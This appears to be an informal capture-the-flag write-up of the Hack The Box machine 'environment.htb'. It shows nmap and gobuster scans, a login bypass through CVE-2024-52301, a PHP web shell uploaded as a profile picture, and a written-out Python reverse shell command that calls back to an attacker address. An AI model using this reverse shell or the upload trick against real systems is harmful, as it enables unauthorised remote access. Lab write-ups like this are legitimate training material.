Quick port scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=10000 10.10.11.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 14:45 EEST
Nmap scan report for 10.10.11.67
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.57 seconds
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.10.11.67     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 14:45 EEST
Nmap scan report for 10.10.11.67
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
```
So there is an SSH and a website.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://environment.htb/ -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://environment.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2391]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/upload               (Status: 405) [Size: 244852]
/up                   (Status: 200) [Size: 2126]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/mailing              (Status: 405) [Size: 244854]
Progress: 11823 / 220561 (5.36%)[ERROR] Get "http://environment.htb/2220": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 86075 / 220561 (39.03%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 86075 / 220561 (39.03%)
```

I found the CVE called Argument Injection Vulnerability (CVE-2024-52301) and it allowed me to login
after changing the post request /login into /login?--env=prepred. It worked since it was hardcoded that if the app environment is propred it lets you inside.

I don't see anything crazy inside other than that we can upload a profile picture. Im thinking its going to be a way to get a shell.

Im having a hard time getting a revshell into the system, but i know that the images are stored in /storage/files/<lorem lipsum>


I was able to import a reverse shell inside and gain access

```bash
http://environment.htb//storage//files//test1.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%2210.10.14.102%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22bash%22)%27
```

I ran linpeas and i was able to run bash as root and able to gain a root shell. I feel like its a glitch or smth since i looked at other peoples walkthroughs and none of them had the same thing.


